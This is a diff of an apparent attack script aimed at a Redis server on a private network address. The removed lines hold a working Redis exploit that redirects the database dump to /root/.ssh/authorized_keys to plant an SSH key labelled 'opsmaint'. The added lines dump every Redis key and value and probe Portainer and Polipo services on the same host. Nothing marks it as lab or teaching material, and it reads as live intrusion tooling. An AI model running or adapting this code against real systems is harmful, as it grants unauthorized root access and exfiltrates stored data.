@@ -1,18 +1,31 @@
-echo "=== REDIS RCE ==="
+echo "=== REDIS KEYS ==="
 python3 << 'RPY'
 import socket,time
-def rcmd(s,cmd):
-    s.sendall((cmd+"\r\n").encode()); time.sleep(0.5)
-    try: return s.recv(2000).decode(errors="replace")[:200]
-    except: return "no-reply"
+def rcmd(s,cmd,t=1):
+    s.sendall((cmd+"\r\n").encode()); time.sleep(t)
+    try: return s.recv(4000).decode(errors="replace")
+    except: return ""
 s=socket.socket();s.settimeout(6);s.connect(("192.168.3.121",6379))
-print("DIR:",rcmd(s,"CONFIG GET dir"))
-print("DBFILE:",rcmd(s,"CONFIG GET dbfilename"))
-KEY="ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHz4ixvYbBfcSQKO3RpTop1thSI2mQx6b9E7SQjrXrno opsmaint"
-print("DIR-SET:",rcmd(s,"CONFIG SET dir /root/.ssh"))
-print("DB-SET:",rcmd(s,"CONFIG SET dbfilename authorized_keys"))
-print("KEY-SET:",rcmd(s,'SET k "\n\n'+KEY+'\n\n"'))
-print("SAVE:",rcmd(s,"SAVE"))
+# Все ключи
+keys=rcmd(s,"KEYS *",2)
+print("KEYS:",keys[:500])
+# DBSIZE
+print("DBSIZE:",rcmd(s,"DBSIZE"))
+# INFO keyspace
+print("KEYSPACE:",rcmd(s,"INFO keyspace")[:200])
+# Перебор первых ключей
+for line in keys.split("\n"):
+    if line.startswith('"') and line.count('"')>=2:
+        k=line.split('"')[1]
+        v=rcmd(s,f"GET {k}",1)
+        print(f"KEY[{k}]:",v[:100])
+        if len([x for x in keys.split(chr(10)) if x.startswith('"')])>20: break
 s.close()
 RPY
-echo REDIS-RCE-DONE
+echo "=== PORTAINER ==="
+wget -q -T 6 -O - http://192.168.3.121:9000/api/status 2>/dev/null | head -c 200
+echo
+echo "=== POLIPO 8123 ==="
+wget -q -T 6 -O - http://192.168.3.121:8123/ 2>/dev/null | head -c 100
+echo
+echo DUMP-DONE
